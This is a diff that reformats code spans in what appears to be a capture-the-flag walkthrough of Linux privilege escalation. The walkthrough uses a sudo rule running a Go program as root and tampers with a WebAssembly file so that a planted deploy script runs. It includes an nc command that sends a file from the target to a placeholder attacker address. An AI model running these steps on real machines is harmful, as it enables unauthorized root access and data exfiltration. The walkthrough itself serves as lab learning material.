@@ -67,8 +67,8 @@ We can now ssh into the machine as suer admin using the obtained creds.
 
 First, I checked what sudo capabilities our user admin got.
 
-`sudo -l
-(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go`
+`sudo -l`
+`(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go`
 
 So we can run `/usr/bin/go run /opt/wasm-functions/index.go` with root privileges. Let’s check out the file.
 
@@ -76,9 +76,9 @@ If we're able to control the f variable, then we can create a deploy.sh to be ex
 
 We make our working directory in tmp and copy over the main.wasm file.
 
-`cd tmp
-mkdir work && cd work
-cp /opt/wasm-functions/main.wasm ./`
+`cd tmp`
+`mkdir work && cd work`
+`cp /opt/wasm-functions/main.wasm ./`
 
 Writing our own deploy echoing the id of the user gives us the error 'Not ready to deploy'. So the value of f is not 1, which is read from the wasm file.
 
@@ -86,8 +86,8 @@ The text readable format of WASM binary is WAT(Web Assembly Text). We can manipu
 
 We install the toolsuit https://github.com/webassembly/wabt We have 2 binaries wasm2wat and wat2wasm that we can use, then we transfer the main.wasm file from the target machine to our local machine using nc.
 
-`cat main.wasm | nc {your-ip} {your-port}   (on target)
-nc -lnvp {your-port} > main.wasm           (on local)`
+`cat main.wasm | nc {your-ip} {your-port}   (on target)`
+`nc -lnvp {your-port} > main.wasm           (on local)`
 
 Then, we convert the wasm to wat
 
